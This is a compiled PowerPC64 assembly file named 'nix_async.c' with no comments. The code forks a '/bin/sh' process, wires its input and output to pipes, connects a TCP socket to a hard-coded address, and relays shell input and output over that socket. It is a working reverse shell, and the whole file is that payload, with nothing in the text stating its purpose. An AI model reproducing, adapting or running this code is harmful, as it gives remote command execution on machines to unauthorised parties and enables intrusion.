	.file	"nix_async.c"
	.abiversion 2
	.section	".toc","aw"
	.section	".text"
	.section	.text.startup,"ax",@progbits
	.align 2
	.globl main
	.type	main, @function
main:
0:	addis 2,12,.TOC.-0b@ha
	addi 2,2,.TOC.-0b@l
	.localentry	main,.-main
	mflr 0
	bl _savegpr0_25
	stdu 1,-8464(1)
	addi 3,1,8392
	bl pipe
	nop
	addi 3,1,8384
	bl pipe
	nop
	bl fork
	nop
	mr. 28,3
	lwz 3,8392(1)
	extsw 3,3
	bne 0,.L2
	li 4,0
	bl dup2
	nop
	lwa 3,8388(1)
	li 4,1
	bl dup2
	nop
	lwa 3,8388(1)
	li 4,2
	bl dup2
	nop
	lwa 3,8392(1)
	bl close
	nop
	lwa 3,8396(1)
	bl close
	nop
	lwa 3,8384(1)
	bl close
	nop
	lwa 3,8388(1)
	bl close
	nop
	addis 3,2,.LC1@toc@ha
	addi 4,1,8368
	std 28,8376(1)
	addi 3,3,.LC1@toc@l
	li 5,0
	std 3,8368(1)
	bl execve
	nop
	b .L3
.L2:
	bl close
	nop
	lwa 3,8388(1)
	li 29,1
	li 26,0
	addi 27,1,8224
	li 25,1
	bl close
	nop
	li 4,1
	li 5,0
	li 3,2
	bl socket
	nop
	li 9,2
	addi 4,1,8352
	li 5,16
	sth 9,8352(1)
	li 9,-11772
	mr 30,3
	sth 9,8354(1)
	lis 9,0x100
	ori 9,9,127
	std 9,8356(1)
	bl connect
	nop
	srawi 9,30,6
	addze 9,9
	addi 7,1,32
	extsw 31,9
	slwi 9,9,6
	subf 9,9,30
	sldi 31,31,3
	sld 29,29,9
	add 31,7,31
.L7:
	li 10,16
	li 9,0
	mtctr 10
.L4:
	stdx 26,9,27
	addi 9,9,8
	bdnz .L4
	ld 9,8192(31)
	lwz 10,8384(1)
	addi 7,1,32
	li 3,1024
	mr 4,27
	li 5,0
	li 6,0
	or 9,9,29
	srawi 8,10,6
	addze 8,8
	std 9,8192(31)
	extsw 9,8
	slwi 8,8,6
	sldi 9,9,3
	subf 10,8,10
	add 9,7,9
	sld 10,25,10
	li 7,0
	ld 8,8192(9)
	or 10,10,8
	std 10,8192(9)
	bl select
	nop
	cmpwi 7,3,0
	blt 7,.L5
	ld 9,8192(31)
	and. 10,29,9
	beq 0,.L6
	li 5,8192
	mr 3,30
	addi 4,1,32
	bl read
	nop
	extsw 5,3
	cmpwi 7,5,0
	ble 7,.L5
	lwa 3,8396(1)
	addi 4,1,32
	bl write
	nop
.L6:
	lwz 8,8384(1)
	addi 7,1,32
	srawi 10,8,6
	addze 10,10
	extsw 3,8
	extsw 9,10
	slwi 10,10,6
	sldi 9,9,3
	subf 8,10,8
	add 9,7,9
	ld 10,8192(9)
	srad 10,10,8
	rldicl. 9,10,0,63
	beq 0,.L7
	li 5,8192
	mr 4,7
	bl read
	nop
	extsw 5,3
	cmpwi 7,5,0
	ble 7,.L5
	mr 3,30
	addi 4,1,32
	bl write
	nop
	b .L7
.L5:
	mr 3,28
	li 4,17
	bl kill
	nop
	mr 3,30
	bl close
	nop
.L3:
	lwa 3,8396(1)
	bl close
	nop
	lwa 3,8384(1)
	bl close
	nop
	addi 1,1,8464
	li 3,0
	b _restgpr0_25
	.long 0
	.byte 0,0,0,1,128,7,0,0
	.size	main,.-main
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC1:
	.string	"/bin/sh"
	.ident	"GCC: (Debian 4.9.2-10) 4.9.2"
	.section	.note.GNU-stack,"",@progbits
